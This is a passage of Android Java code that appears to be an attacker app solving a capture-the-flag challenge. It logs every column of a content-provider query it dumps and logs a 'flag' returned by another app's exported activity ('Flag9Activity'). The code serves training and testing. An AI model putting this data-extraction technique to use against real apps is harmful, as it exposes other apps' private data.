                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.v("DumpContentProviderQuery", sb.toString());
            } while (cursor.moveToNext());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        //Flag9Activity
        if (requestCode == 9 && resultCode == -1) {
            if (data != null) {
                String flag = data.getStringExtra("flag");
                Log.d("Flag9", "Flag is: " + flag);
            }
        }
    }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putInt("count",count);
        Log.v("MainActivity.onSaveInstanceState", String.format("Saving count: %d", count));
    }

    @Override
    protected void onRestoreInstanceState(@NonNull Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        count = savedInstanceState.getInt("count");
        Log.v("MainActivity.onRestoreInstanceState", String.format("Restoring count: %d", count));
    }
}